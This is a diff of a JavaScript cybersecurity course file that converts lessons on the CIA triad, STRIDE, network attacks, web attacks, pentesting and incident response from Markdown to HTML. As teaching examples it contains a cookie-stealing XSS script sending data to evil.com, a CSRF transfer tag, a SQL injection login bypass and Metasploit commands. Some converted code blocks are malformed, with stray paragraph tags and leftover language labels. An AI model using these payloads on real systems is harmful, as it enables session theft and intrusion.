@@ -198,6 +198,7 @@ Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
           <p>Given an <code>IP</code> address, you can find out which country and city it belongs to.</p>
           <p>The mapping is not official and not exact, but it gives the right answer in most cases.</p>
           <p><strong>Example:</strong> <a href="http://www.geoiptool.com" target="_blank">geoiptool.com</a></p>
+          <p>Try it: visit <a href="http://www.geoiptool.com" target="_blank">geoiptool.com</a> to see your own location.</p>
         `
       },
       {}, // Page 11: thinkOutside — skip
@@ -4121,55 +4122,67 @@ AllowedIPs = 0.0.0.0/0</pre>
     pages: [
       {
         titleEn: "The CIA Triad",
-        contentEn: `Every security system is built on three pillars — the **CIA Triad**:
+        contentEn: `<p>Every security system is built on three pillars — the <strong>CIA Triad</strong>:</p>
 
-- **Confidentiality** — only the right people can see the data. Example: encryption, access control.
-- **Integrity** — data is not changed without permission. Example: checksums, digital signatures.
-- **Availability** — the system works when users need it. Example: backups, redundancy.
+<ul>
+<li><strong>Confidentiality</strong> — only the right people can see the data. Example: encryption, access control.</li>
+<li><strong>Integrity</strong> — data is not changed without permission. Example: checksums, digital signatures.</li>
+<li><strong>Availability</strong> — the system works when users need it. Example: backups, redundancy.</li>
+</ul>
 
-If one pillar breaks, the whole system is at risk.
+<p>If one pillar breaks, the whole system is at risk.</p>
 
-**Quick check:**
-- A hacker deletes your database → which pillar is broken? → **Availability**
-- A hacker reads your passwords → **Confidentiality**
-- A hacker changes your bank balance → **Integrity**`
+<p><strong>Quick check:</strong></p>
+<ul>
+<li>A hacker deletes your database → which pillar is broken? → <strong>Availability</strong></li>
+<li>A hacker reads your passwords → <strong>Confidentiality</strong></li>
+<li>A hacker changes your bank balance → <strong>Integrity</strong></li>
+</ul>`
       },
       {
         titleEn: "STRIDE Threat Modeling",
-        contentEn: `**STRIDE** is a framework by Microsoft. It helps teams find threats before attackers do.
+        contentEn: `<p><strong>STRIDE</strong> is a framework by Microsoft. It helps teams find threats before attackers do.</p>
 
-Each letter is a threat type:
-- **S**poofing — pretending to be someone else (fake login)
-- **T**ampering — changing data without permission
-- **R**epudiation — denying you did something (no logs)
-- **I**nformation Disclosure — leaking private data
-- **D**enial of Service — making the system unavailable
-- **E**levation of Privilege — getting admin access as a normal user
+<p>Each letter is a threat type:</p>
+<ul>
+<li><strong>S</strong>poofing — pretending to be someone else (fake login)</li>
+<li><strong>T</strong>ampering — changing data without permission</li>
+<li><strong>R</strong>epudiation — denying you did something (no logs)</li>
+<li><strong>I</strong>nformation Disclosure — leaking private data</li>
+<li><strong>D</strong>enial of Service — making the system unavailable</li>
+<li><strong>E</strong>levation of Privilege — getting admin access as a normal user</li>
+</ul>
 
-**How to use STRIDE:**
-1. Draw a diagram of your system
-2. For each component, ask: "Can an attacker do S? T? R? I? D? E?"
-3. For each threat found, plan a defense`
+<p><strong>How to use STRIDE:</strong></p>
+<ol>
+<li>Draw a diagram of your system</li>
+<li>For each component, ask: "Can an attacker do S? T? R? I? D? E?"</li>
+<li>For each threat found, plan a defense</li>
+</ol>`
       },
       {
         titleEn: "Story: The Target Breach (2013)",
-        contentEn: `In December 2013, hackers stole **40 million** credit card numbers from Target stores.
+        contentEn: `<p>In December 2013, hackers stole <strong>40 million</strong> credit card numbers from Target stores.</p>
 
-**How it happened:**
-- Attackers sent a phishing email to an HVAC company (heating/cooling vendor)
-- The vendor had network access to Target for billing
-- Hackers used that access to move inside Target's network
-- They installed malware on cash registers (POS systems)
-- Every credit card swipe was copied and sent to the attackers
+<p><strong>How it happened:</strong></p>
+<ul>
+<li>Attackers sent a phishing email to an HVAC company (heating/cooling vendor)</li>
+<li>The vendor had network access to Target for billing</li>
+<li>Hackers used that access to move inside Target's network</li>
+<li>They installed malware on cash registers (POS systems)</li>
+<li>Every credit card swipe was copied and sent to the attackers</li>
+</ul>
 
-**CIA Triad analysis:**
-- **Confidentiality** broken — 40M card numbers leaked
-- **Integrity** broken — malware changed how POS systems worked
-- **Availability** was fine — stores kept working (that's why nobody noticed)
+<p><strong>CIA Triad analysis:</strong></p>
+<ul>
+<li><strong>Confidentiality</strong> broken — 40M card numbers leaked</li>
+<li><strong>Integrity</strong> broken — malware changed how POS systems worked</li>
+<li><strong>Availability</strong> was fine — stores kept working (that's why nobody noticed)</li>
+</ul>
 
-**Lesson:** Your security is only as strong as your weakest vendor. This attack started with a simple phishing email.
+<p><strong>Lesson:</strong> Your security is only as strong as your weakest vendor. This attack started with a simple phishing email.</p>
 
-**Cost to Target:** $292 million in damages. The CEO and CIO both lost their jobs.`
+<p><strong>Cost to Target:</strong> $292 million in damages. The CEO and CIO both lost their jobs.</p>`
       }
     ]
   },
@@ -4179,69 +4192,89 @@ Each letter is a threat type:
     pages: [
       {
         titleEn: "ARP Spoofing & Man-in-the-Middle",
-        contentEn: `**ARP** (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network.
+        contentEn: `<p><strong>ARP</strong> (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network.</p>
 
-**ARP Spoofing attack:**
-1. Attacker sends fake ARP messages to the network
-2. Tells the victim: "I am the router" (sends attacker's MAC)
-3. Tells the router: "I am the victim"
-4. Now all traffic flows through the attacker — **Man-in-the-Middle (MITM)**
+<p><strong>ARP Spoofing attack:</strong></p>
+<ol>
+<li>Attacker sends fake ARP messages to the network</li>
+<li>Tells the victim: "I am the router" (sends attacker's MAC)</li>
+<li>Tells the router: "I am the victim"</li>
+<li>Now all traffic flows through the attacker — <strong>Man-in-the-Middle (MITM)</strong></li>
+</ol>
 
-**What the attacker can do:**
-- Read unencrypted passwords and messages
-- Modify data in transit (change a bank transfer amount)
-- Inject malicious code into web pages
+<p><strong>What the attacker can do:</strong></p>
+<ul>
+<li>Read unencrypted passwords and messages</li>
+<li>Modify data in transit (change a bank transfer amount)</li>
+<li>Inject malicious code into web pages</li>
+</ul>
 
-**Defenses:**
-- Use **HTTPS** everywhere (encrypted traffic)
-- Enable **Dynamic ARP Inspection (DAI)** on switches
-- Use **VPN** on untrusted networks (coffee shop WiFi)
-- Static ARP entries for critical servers`
+<p><strong>Defenses:</strong></p>
+<ul>
+<li>Use <strong>HTTPS</strong> everywhere (encrypted traffic)</li>
+<li>Enable <strong>Dynamic ARP Inspection (DAI)</strong> on switches</li>
+<li>Use <strong>VPN</strong> on untrusted networks (coffee shop WiFi)</li>
+<li>Static ARP entries for critical servers</li>
+</ul>`
       },
       {
         titleEn: "SYN Flood & TCP Exhaustion",
-        contentEn: `**TCP 3-Way Handshake** (normal):
-1. Client sends **SYN** → "I want to connect"
-2. Server sends **SYN-ACK** → "OK, go ahead"
-3. Client sends **ACK** → "Connected!"
+        contentEn: `<p><strong>TCP 3-Way Handshake</strong> (normal):</p>
+<ol>
+<li>Client sends <strong>SYN</strong> → "I want to connect"</li>
+<li>Server sends <strong>SYN-ACK</strong> → "OK, go ahead"</li>
+<li>Client sends <strong>ACK</strong> → "Connected!"</li>
+</ol>
 
-**SYN Flood attack:**
-- Attacker sends thousands of SYN packets with fake source IPs
-- Server sends SYN-ACK and waits for ACK... that never comes
-- Server's connection table fills up — **no room for real users**
-- Result: legitimate users cannot connect
+<p><strong>SYN Flood attack:</strong></p>
+<ul>
+<li>Attacker sends thousands of SYN packets with fake source IPs</li>
+<li>Server sends SYN-ACK and waits for ACK... that never comes</li>
+<li>Server's connection table fills up — <strong>no room for real users</strong></li>
+<li>Result: legitimate users cannot connect</li>
+</ul>
 
-**Why it works:**
-- The server must keep each half-open connection in memory
-- Default timeout is 75 seconds per connection
-- Attacker can send millions of SYNs per second
+<p><strong>Why it works:</strong></p>
+<ul>
+<li>The server must keep each half-open connection in memory</li>
+<li>Default timeout is 75 seconds per connection</li>
+<li>Attacker can send millions of SYNs per second</li>
+</ul>
 
-**Defenses:**
-- **SYN Cookies** — server doesn't store state until handshake completes
-- **Rate limiting** — limit SYN packets per source IP
-- **Firewall rules** — detect and block flood patterns`
+<p><strong>Defenses:</strong></p>
+<ul>
+<li><strong>SYN Cookies</strong> — server doesn't store state until handshake completes</li>
+<li><strong>Rate limiting</strong> — limit SYN packets per source IP</li>
+<li><strong>Firewall rules</strong> — detect and block flood patterns</li>
+</ul>`
       },
       {
         titleEn: "Story: The 3.47 Tbps DDoS Attack",
-        contentEn: `In November 2021, Microsoft Azure stopped the **largest DDoS attack ever recorded**: **3.47 Tbps** (terabits per second).
+        contentEn: `<p>In November 2021, Microsoft Azure stopped the <strong>largest DDoS attack ever recorded</strong>: <strong>3.47 Tbps</strong> (terabits per second).</p>
 
-**Scale:**
-- 3.47 Tbps = downloading ~43,000 HD movies per second
-- The attack came from **10,000+ sources** across 10+ countries
-- It lasted only 15 minutes but peaked at 340 million packets per second
+<p><strong>Scale:</strong></p>
+<ul>
+<li>3.47 Tbps = downloading ~43,000 HD movies per second</li>
+<li>The attack came from <strong>10,000+ sources</strong> across 10+ countries</li>
+<li>It lasted only 15 minutes but peaked at 340 million packets per second</li>
+</ul>
 
-**How it was stopped:**
-- Azure's DDoS Protection platform detected the spike in seconds
-- Traffic was spread across Microsoft's global network (160+ data centers)
-- Bad traffic was filtered; good traffic passed through
-- The customer's service stayed online the entire time
+<p><strong>How it was stopped:</strong></p>
+<ul>
+<li>Azure's DDoS Protection platform detected the spike in seconds</li>
+<li>Traffic was spread across Microsoft's global network (160+ data centers)</li>
+<li>Bad traffic was filtered; good traffic passed through</li>
+<li>The customer's service stayed online the entire time</li>
+</ul>
 
-**Types of DDoS:**
-- **Volumetric** — flood the bandwidth (UDP flood, DNS amplification)
-- **Protocol** — exhaust server resources (SYN flood, Ping of Death)
-- **Application** — target specific services (HTTP flood, Slowloris)
+<p><strong>Types of DDoS:</strong></p>
+<ul>
+<li><strong>Volumetric</strong> — flood the bandwidth (UDP flood, DNS amplification)</li>
+<li><strong>Protocol</strong> — exhaust server resources (SYN flood, Ping of Death)</li>
+<li><strong>Application</strong> — target specific services (HTTP flood, Slowloris)</li>
+</ul>
 
-**Key point:** You cannot stop DDoS alone. You need cloud-scale protection (Azure, Cloudflare, AWS Shield).`
+<p><strong>Key point:</strong> You cannot stop DDoS alone. You need cloud-scale protection (Azure, Cloudflare, AWS Shield).</p>`
       }
     ]
   },
@@ -4251,81 +4284,92 @@ Each letter is a threat type:
     pages: [
       {
         titleEn: "SQL Injection (SQLi)",
-        contentEn: `**SQL Injection** — the attacker puts SQL code into input fields to control the database.
+        contentEn: `<p><strong>SQL Injection</strong> — the attacker puts SQL code into input fields to control the database.</p>
 
-**Example — login bypass:**
-\`\`\`
-Username: admin' --
-Password: anything
-\`\`\`
+<p><strong>Example — login bypass:</strong></p>
+<pre><code>Username: admin' --
+<p>Password: anything</p>
+</code></pre>
 
-The server builds this query:
-\`\`\`sql
-SELECT * FROM users WHERE name='admin' --' AND pass='anything'
-\`\`\`
+<p>The server builds this query:</p>
+<pre><code>sql
+<p>SELECT * FROM users WHERE name='admin' --' AND pass='anything'</p>
+</code></pre>
 
-The \`--\` is a comment. Everything after it is ignored. The attacker logs in as admin without a password.
+<p>The <code>--</code> is a comment. Everything after it is ignored. The attacker logs in as admin without a password.</p>
 
-**What an attacker can do:**
-- Read all data (usernames, passwords, credit cards)
-- Modify or delete data
-- Execute system commands (on some databases)
+<p><strong>What an attacker can do:</strong></p>
+<ul>
+<li>Read all data (usernames, passwords, credit cards)</li>
+<li>Modify or delete data</li>
+<li>Execute system commands (on some databases)</li>
+</ul>
 
-**Defenses:**
-- **Parameterized queries** (prepared statements) — #1 defense
-- **Input validation** — reject special characters
-- **WAF** (Web Application Firewall) — block known attack patterns
-- **Least privilege** — database user should not be admin`
+<p><strong>Defenses:</strong></p>
+<ul>
+<li><strong>Parameterized queries</strong> (prepared statements) — #1 defense</li>
+<li><strong>Input validation</strong> — reject special characters</li>
+<li><strong>WAF</strong> (Web Application Firewall) — block known attack patterns</li>
+<li><strong>Least privilege</strong> — database user should not be admin</li>
+</ul>`
       },
       {
         titleEn: "XSS and CSRF",
-        contentEn: `**XSS (Cross-Site Scripting)** — attacker injects JavaScript into a web page.
+        contentEn: `<p><strong>XSS (Cross-Site Scripting)</strong> — attacker injects JavaScript into a web page.</p>
 
-**Types:**
-- **Stored XSS** — script is saved in the database (e.g., in a comment). Every user who views it gets attacked.
-- **Reflected XSS** — script is in the URL. Victim clicks a malicious link.
-- **DOM XSS** — script runs from client-side JavaScript, never touches the server.
+<p><strong>Types:</strong></p>
+<ul>
+<li><strong>Stored XSS</strong> — script is saved in the database (e.g., in a comment). Every user who views it gets attacked.</li>
+<li><strong>Reflected XSS</strong> — script is in the URL. Victim clicks a malicious link.</li>
+<li><strong>DOM XSS</strong> — script runs from client-side JavaScript, never touches the server.</li>
+</ul>
 
-**Example:**
-\`\`\`html
+<p><strong>Example:</strong></p>
+<pre><code>html
 <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
-\`\`\`
+</code></pre>
 
-**CSRF (Cross-Site Request Forgery)** — the attacker tricks your browser into making a request you didn't intend.
+<p><strong>CSRF (Cross-Site Request Forgery)</strong> — the attacker tricks your browser into making a request you didn't intend.</p>
 
-**Example:** You are logged into your bank. You visit a malicious page with:
-\`\`\`html
+<p><strong>Example:</strong> You are logged into your bank. You visit a malicious page with:</p>
+<pre><code>html
 <img src="https://bank.com/transfer?to=attacker&amount=1000">
-\`\`\`
-Your browser sends the request with your session cookie. The bank thinks it's you.
+</code></pre>
+<p>Your browser sends the request with your session cookie. The bank thinks it's you.</p>
 
-**Defenses:**
-- XSS → **escape/encode** all user output, use **Content Security Policy (CSP)**
-- CSRF → **CSRF tokens**, **SameSite cookies**, check **Referer header**`
+<p><strong>Defenses:</strong></p>
+<ul>
+<li>XSS → <strong>escape/encode</strong> all user output, use <strong>Content Security Policy (CSP)</strong></li>
+<li>CSRF → <strong>CSRF tokens</strong>, <strong>SameSite cookies</strong>, check <strong>Referer header</strong></li>
+</ul>`
       },
       {
         titleEn: "OWASP Top 10 (2021)",
-        contentEn: `**OWASP** (Open Web Application Security Project) publishes the top 10 web security risks every few years.
+        contentEn: `<p><strong>OWASP</strong> (Open Web Application Security Project) publishes the top 10 web security risks every few years.</p>
 
-**The 2021 list:**
+<p><strong>The 2021 list:</strong></p>
 
-| # | Risk | Example |
-|---|------|---------|
-| 1 | **Broken Access Control** | User changes URL to access admin page |
-| 2 | **Cryptographic Failures** | Passwords stored in plain text |
-| 3 | **Injection** | SQL injection, command injection |
-| 4 | **Insecure Design** | No rate limiting on login (brute force) |
-| 5 | **Security Misconfiguration** | Default passwords, open S3 buckets |
-| 6 | **Vulnerable Components** | Using old library with known CVE |
-| 7 | **Auth Failures** | Weak passwords, no MFA |
-| 8 | **Data Integrity Failures** | Insecure deserialization, no code signing |
-| 9 | **Logging Failures** | No logs → can't detect attacks |
-| 10 | **SSRF** | Server fetches attacker-controlled URL |
+<table>
+<thead><tr><th>#</th><th>Risk</th><th>Example</th></tr></thead>
+<tbody>
+<tr><td>1</td><td><strong>Broken Access Control</strong></td><td>User changes URL to access admin page</td></tr>
+<tr><td>2</td><td><strong>Cryptographic Failures</strong></td><td>Passwords stored in plain text</td></tr>
+<tr><td>3</td><td><strong>Injection</strong></td><td>SQL injection, command injection</td></tr>
+<tr><td>4</td><td><strong>Insecure Design</strong></td><td>No rate limiting on login (brute force)</td></tr>
+<tr><td>5</td><td><strong>Security Misconfiguration</strong></td><td>Default passwords, open S3 buckets</td></tr>
+<tr><td>6</td><td><strong>Vulnerable Components</strong></td><td>Using old library with known CVE</td></tr>
+<tr><td>7</td><td><strong>Auth Failures</strong></td><td>Weak passwords, no MFA</td></tr>
+<tr><td>8</td><td><strong>Data Integrity Failures</strong></td><td>Insecure deserialization, no code signing</td></tr>
+<tr><td>9</td><td><strong>Logging Failures</strong></td><td>No logs → can't detect attacks</td></tr>
+<tr><td>10</td><td><strong>SSRF</strong></td><td>Server fetches attacker-controlled URL</td></tr>
+</tbody></table>
 
-**Key changes from 2017:**
-- Broken Access Control moved from #5 to #1
-- Insecure Design is new (focus on threat modeling)
-- SSRF is new (cloud environments made it worse)`
+<p><strong>Key changes from 2017:</strong></p>
+<ul>
+<li>Broken Access Control moved from #5 to #1</li>
+<li>Insecure Design is new (focus on threat modeling)</li>
+<li>SSRF is new (cloud environments made it worse)</li>
+</ul>`
       }
     ]
   },
@@ -4335,89 +4379,115 @@ Your browser sends the request with your session cookie. The bank thinks it's yo
     pages: [
       {
         titleEn: "The Pentest Lifecycle",
-        contentEn: `**Penetration testing (pentest)** = authorized hacking to find security weaknesses.
+        contentEn: `<p><strong>Penetration testing (pentest)</strong> = authorized hacking to find security weaknesses.</p>
 
-**5 phases:**
+<p><strong>5 phases:</strong></p>
 
-**1. Reconnaissance (Recon)**
-- Passive: Google dorking, WHOIS, LinkedIn, Shodan
-- Active: port scanning, service detection
-- Goal: learn everything about the target
+<p><strong>1. Reconnaissance (Recon)</strong></p>
+<ul>
+<li>Passive: Google dorking, WHOIS, LinkedIn, Shodan</li>
+<li>Active: port scanning, service detection</li>
+<li>Goal: learn everything about the target</li>
+</ul>
 
-**2. Scanning & Enumeration**
-- Find open ports, running services, versions
-- Identify operating systems and technologies
-- Look for known vulnerabilities (CVEs)
+<p><strong>2. Scanning & Enumeration</strong></p>
+<ul>
+<li>Find open ports, running services, versions</li>
+<li>Identify operating systems and technologies</li>
+<li>Look for known vulnerabilities (CVEs)</li>
+</ul>
 
-**3. Exploitation**
-- Try to break in using found vulnerabilities
-- Gain initial access (foothold)
-- Escalate privileges if possible
+<p><strong>3. Exploitation</strong></p>
+<ul>
+<li>Try to break in using found vulnerabilities</li>
+<li>Gain initial access (foothold)</li>
+<li>Escalate privileges if possible</li>
+</ul>
 
-**4. Post-Exploitation**
-- Move laterally (access other systems)
-- Maintain access (persistence)
-- Collect evidence (screenshots, data samples)
+<p><strong>4. Post-Exploitation</strong></p>
+<ul>
+<li>Move laterally (access other systems)</li>
+<li>Maintain access (persistence)</li>
+<li>Collect evidence (screenshots, data samples)</li>
+</ul>
 
-**5. Reporting**
-- Document every finding with severity rating
-- Include proof-of-concept (PoC) for each vulnerability
-- Recommend fixes with priority order
+<p><strong>5. Reporting</strong></p>
+<ul>
+<li>Document every finding with severity rating</li>
+<li>Include proof-of-concept (PoC) for each vulnerability</li>
+<li>Recommend fixes with priority order</li>
+</ul>
 
-**Important:** Always get **written permission** before testing. Without it, it's a crime.`
+<p><strong>Important:</strong> Always get <strong>written permission</strong> before testing. Without it, it's a crime.</p>`
       },
       {
         titleEn: "Essential Pentest Tools",
-        contentEn: `**Nmap** — network scanner
-- Finds open ports and running services
-- \`nmap -sV -sC target.com\` — version detection + default scripts
-- \`nmap -p- target.com\` — scan all 65,535 ports
-- Can detect OS, firewalls, and vulnerabilities
+        contentEn: `<p><strong>Nmap</strong> — network scanner</p>
+<ul>
+<li>Finds open ports and running services</li>
+<li><code>nmap -sV -sC target.com</code> — version detection + default scripts</li>
+<li><code>nmap -p- target.com</code> — scan all 65,535 ports</li>
+<li>Can detect OS, firewalls, and vulnerabilities</li>
+</ul>
 
-**Burp Suite** — web application proxy
-- Intercepts HTTP/HTTPS requests between browser and server
-- **Repeater** — modify and resend requests
-- **Intruder** — automated fuzzing and brute force
-- **Scanner** — automatic vulnerability detection (Pro version)
+<p><strong>Burp Suite</strong> — web application proxy</p>
+<ul>
+<li>Intercepts HTTP/HTTPS requests between browser and server</li>
+<li><strong>Repeater</strong> — modify and resend requests</li>
+<li><strong>Intruder</strong> — automated fuzzing and brute force</li>
+<li><strong>Scanner</strong> — automatic vulnerability detection (Pro version)</li>
+</ul>
 
-**Metasploit** — exploitation framework
-- Database of 2,000+ exploits
-- \`search ms17-010\` → find EternalBlue exploit
-- \`use exploit/...\` → \`set RHOST target\` → \`exploit\`
-- **Meterpreter** — powerful post-exploitation shell
+<p><strong>Metasploit</strong> — exploitation framework</p>
+<ul>
+<li>Database of 2,000+ exploits</li>
+<li><code>search ms17-010</code> → find EternalBlue exploit</li>
+<li><code>use exploit/...</code> → <code>set RHOST target</code> → <code>exploit</code></li>
+<li><strong>Meterpreter</strong> — powerful post-exploitation shell</li>
+</ul>
 
-**Other key tools:**
-- **Wireshark** — packet capture and analysis
-- **John the Ripper / Hashcat** — password cracking
-- **Gobuster / ffuf** — directory and file brute forcing
-- **SQLMap** — automated SQL injection testing`
+<p><strong>Other key tools:</strong></p>
+<ul>
+<li><strong>Wireshark</strong> — packet capture and analysis</li>
+<li><strong>John the Ripper / Hashcat</strong> — password cracking</li>
+<li><strong>Gobuster / ffuf</strong> — directory and file brute forcing</li>
+<li><strong>SQLMap</strong> — automated SQL injection testing</li>
+</ul>`
       },
       {
         titleEn: "Story: Red Team vs. The Bank",
-        contentEn: `A major bank hired a Red Team to test their security. The rules: get access to the CEO's email within 2 weeks.
+        contentEn: `<p>A major bank hired a Red Team to test their security. The rules: get access to the CEO's email within 2 weeks.</p>
 
-**Week 1 — Reconnaissance:**
-- Team found the bank's IT staff on LinkedIn
-- Discovered the bank used Microsoft 365 and Citrix VPN
-- Found an old subdomain: \`test-portal.bank.com\` — still running
+<p><strong>Week 1 — Reconnaissance:</strong></p>
+<ul>
+<li>Team found the bank's IT staff on LinkedIn</li>
+<li>Discovered the bank used Microsoft 365 and Citrix VPN</li>
+<li>Found an old subdomain: <code>test-portal.bank.com</code> — still running</li>
+</ul>
 
-**Week 1 — Initial Access:**
-- The test portal had a known Citrix vulnerability (CVE-2019-19781)
-- Team exploited it and got a shell on an internal server
-- Found a shared drive with an Excel file: "IT_passwords_2019.xlsx"
+<p><strong>Week 1 — Initial Access:</strong></p>
+<ul>
+<li>The test portal had a known Citrix vulnerability (CVE-2019-19781)</li>
+<li>Team exploited it and got a shell on an internal server</li>
+<li>Found a shared drive with an Excel file: "IT_passwords_2019.xlsx"</li>
+</ul>
 
-**Week 2 — Lateral Movement:**
-- Old passwords still worked for 3 IT admin accounts
-- Used admin access to reach the Exchange email server
-- Read the CEO's inbox — mission complete in 8 days
+<p><strong>Week 2 — Lateral Movement:</strong></p>
+<ul>
+<li>Old passwords still worked for 3 IT admin accounts</li>
+<li>Used admin access to reach the Exchange email server</li>
+<li>Read the CEO's inbox — mission complete in 8 days</li>
+</ul>
 
-**Report findings:**
-- Critical: unpatched public-facing server
-- Critical: passwords stored in plain text on shared drive
-- High: old passwords never rotated
-- High: no network segmentation (test server could reach email)
+<p><strong>Report findings:</strong></p>
+<ul>
+<li>Critical: unpatched public-facing server</li>
+<li>Critical: passwords stored in plain text on shared drive</li>
+<li>High: old passwords never rotated</li>
+<li>High: no network segmentation (test server could reach email)</li>
+</ul>
 
-**Result:** The bank fixed all findings, and the Red Team was invited back for a retest 6 months later.`
+<p><strong>Result:</strong> The bank fixed all findings, and the Red Team was invited back for a retest 6 months later.</p>`
       }
     ]
   },
@@ -4427,83 +4497,103 @@ Your browser sends the request with your session cookie. The bank thinks it's yo
     pages: [
       {
         titleEn: "Defense in Depth",
-        contentEn: `**Defense in Depth** = multiple layers of security. If one layer fails, the next one catches the attack.
+        contentEn: `<p><strong>Defense in Depth</strong> = multiple layers of security. If one layer fails, the next one catches the attack.</p>
 
-**The layers (outside → inside):**
+<p><strong>The layers (outside → inside):</strong></p>
 
-- **Physical** — locked server rooms, security cameras, badge access
-- **Perimeter** — firewalls, IDS/IPS, DMZ
-- **Network** — segmentation, VLANs, ACLs, network monitoring
-- **Host** — antivirus, host firewall, patching, hardening
-- **Application** — secure coding, input validation, WAF
-- **Data** — encryption, access control, backups, DLP
+<ul>
+<li><strong>Physical</strong> — locked server rooms, security cameras, badge access</li>
+<li><strong>Perimeter</strong> — firewalls, IDS/IPS, DMZ</li>
+<li><strong>Network</strong> — segmentation, VLANs, ACLs, network monitoring</li>
+<li><strong>Host</strong> — antivirus, host firewall, patching, hardening</li>
+<li><strong>Application</strong> — secure coding, input validation, WAF</li>
+<li><strong>Data</strong> — encryption, access control, backups, DLP</li>
+</ul>
 
-**Why layers matter:**
-- Firewall blocks 99% of attacks → but 1% gets through
-- Antivirus catches most malware → but zero-days pass
-- Encryption protects data → but only if keys are safe
+<p><strong>Why layers matter:</strong></p>
+<ul>
+<li>Firewall blocks 99% of attacks → but 1% gets through</li>
+<li>Antivirus catches most malware → but zero-days pass</li>
+<li>Encryption protects data → but only if keys are safe</li>
+</ul>
 
-**Analogy:** A castle has walls, a moat, guards, locked doors, and a safe. An attacker must beat ALL of them, not just one.
+<p><strong>Analogy:</strong> A castle has walls, a moat, guards, locked doors, and a safe. An attacker must beat ALL of them, not just one.</p>
 
-**Key principles:**
-- No single point of failure
-- Assume every layer will be bypassed
-- Monitor every layer for alerts`
+<p><strong>Key principles:</strong></p>
+<ul>
+<li>No single point of failure</li>
+<li>Assume every layer will be bypassed</li>
+<li>Monitor every layer for alerts</li>
+</ul>`
       },
       {
         titleEn: "SIEM & Incident Response",
-        contentEn: `**SIEM** (Security Information and Event Management) — collects logs from all systems and finds threats.
+        contentEn: `<p><strong>SIEM</strong> (Security Information and Event Management) — collects logs from all systems and finds threats.</p>
 
-**What SIEM does:**
-- Collects logs from firewalls, servers, endpoints, apps
-- Correlates events across systems
-- Detects patterns (e.g., 100 failed logins then 1 success = brute force)
-- Generates alerts for the SOC (Security Operations Center) team
+<p><strong>What SIEM does:</strong></p>
+<ul>
+<li>Collects logs from firewalls, servers, endpoints, apps</li>
+<li>Correlates events across systems</li>
+<li>Detects patterns (e.g., 100 failed logins then 1 success = brute force)</li>
+<li>Generates alerts for the SOC (Security Operations Center) team</li>
+</ul>
 
-**Popular SIEM tools:** Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM
+<p><strong>Popular SIEM tools:</strong> Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM</p>
 
-**Incident Response (IR) — 6 phases (NIST):**
-1. **Preparation** — build the IR team, write playbooks, set up tools
-2. **Identification** — detect the incident (SIEM alert, user report)
-3. **Containment** — stop the attack from spreading (isolate systems)
-4. **Eradication** — remove the attacker (delete malware, patch vuln)
-5. **Recovery** — restore systems from clean backups, monitor closely
-6. **Lessons Learned** — what happened? how to prevent it next time?
+<p><strong>Incident Response (IR) — 6 phases (NIST):</strong></p>
+<ol>
+<li><strong>Preparation</strong> — build the IR team, write playbooks, set up tools</li>
+<li><strong>Identification</strong> — detect the incident (SIEM alert, user report)</li>
+<li><strong>Containment</strong> — stop the attack from spreading (isolate systems)</li>
+<li><strong>Eradication</strong> — remove the attacker (delete malware, patch vuln)</li>
+<li><strong>Recovery</strong> — restore systems from clean backups, monitor closely</li>
+<li><strong>Lessons Learned</strong> — what happened? how to prevent it next time?</li>
+</ol>
 
-**SOC analyst tiers:**
-- **Tier 1** — monitors alerts, triages (real or false positive?)
-- **Tier 2** — investigates confirmed incidents
-- **Tier 3** — threat hunting, malware analysis, forensics`
+<p><strong>SOC analyst tiers:</strong></p>
+<ul>
+<li><strong>Tier 1</strong> — monitors alerts, triages (real or false positive?)</li>
+<li><strong>Tier 2</strong> — investigates confirmed incidents</li>
+<li><strong>Tier 3</strong> — threat hunting, malware analysis, forensics</li>
+</ul>`
       },
       {
         titleEn: "Story: SOC Analyst Finds an APT",
-        contentEn: `Monday morning. A Tier 1 SOC analyst notices something strange in the SIEM:
+        contentEn: `<p>Monday morning. A Tier 1 SOC analyst notices something strange in the SIEM:</p>
 
-**The alert:** A server in the finance department made DNS requests to a domain registered 2 days ago. The requests happened every 4 hours, exactly.
+<p><strong>The alert:</strong> A server in the finance department made DNS requests to a domain registered 2 days ago. The requests happened every 4 hours, exactly.</p>
 
-**Why it's suspicious:**
-- New domains are often used by attackers
-- Regular 4-hour intervals suggest automated malware (beaconing)
-- Finance servers should not make unusual DNS requests
+<p><strong>Why it's suspicious:</strong></p>
+<ul>
+<li>New domains are often used by attackers</li>
+<li>Regular 4-hour intervals suggest automated malware (beaconing)</li>
+<li>Finance servers should not make unusual DNS requests</li>
+</ul>
 
-**Investigation (Tier 2):**
-- The domain resolved to an IP in Eastern Europe
-- The DNS requests contained encoded data in the subdomain field — **DNS exfiltration**
-- The server had a hidden scheduled task running a PowerShell script
-- The script collected financial reports and sent them via DNS
+<p><strong>Investigation (Tier 2):</strong></p>
+<ul>
+<li>The domain resolved to an IP in Eastern Europe</li>
+<li>The DNS requests contained encoded data in the subdomain field — <strong>DNS exfiltration</strong></li>
+<li>The server had a hidden scheduled task running a PowerShell script</li>
+<li>The script collected financial reports and sent them via DNS</li>
+</ul>
 
-**Discovery:**
-- The attacker had been inside the network for **6 months** (APT — Advanced Persistent Threat)
-- Entry point: a spear-phishing email to the CFO with a weaponized PDF
-- The PDF exploited an Adobe Reader vulnerability
+<p><strong>Discovery:</strong></p>
+<ul>
+<li>The attacker had been inside the network for <strong>6 months</strong> (APT — Advanced Persistent Threat)</li>
+<li>Entry point: a spear-phishing email to the CFO with a weaponized PDF</li>
+<li>The PDF exploited an Adobe Reader vulnerability</li>
+</ul>
 
-**Response:**
-- Contained: isolated the server and blocked the domain
-- Eradicated: removed the scheduled task and backdoor
-- Recovered: rebuilt the server from a clean image
-- Lesson: deployed DNS monitoring and blocked DNS over non-standard ports
+<p><strong>Response:</strong></p>
+<ul>
+<li>Contained: isolated the server and blocked the domain</li>
+<li>Eradicated: removed the scheduled task and backdoor</li>
+<li>Recovered: rebuilt the server from a clean image</li>
+<li>Lesson: deployed DNS monitoring and blocked DNS over non-standard ports</li>
+</ul>
 
-**Key takeaway:** APTs are quiet. Without SIEM and trained analysts, this could have continued for years.`
+<p><strong>Key takeaway:</strong> APTs are quiet. Without SIEM and trained analysts, this could have continued for years.</p>`
       }
     ]
   },
@@ -4513,92 +4603,118 @@ Your browser sends the request with your session cookie. The bank thinks it's yo
     pages: [
       {
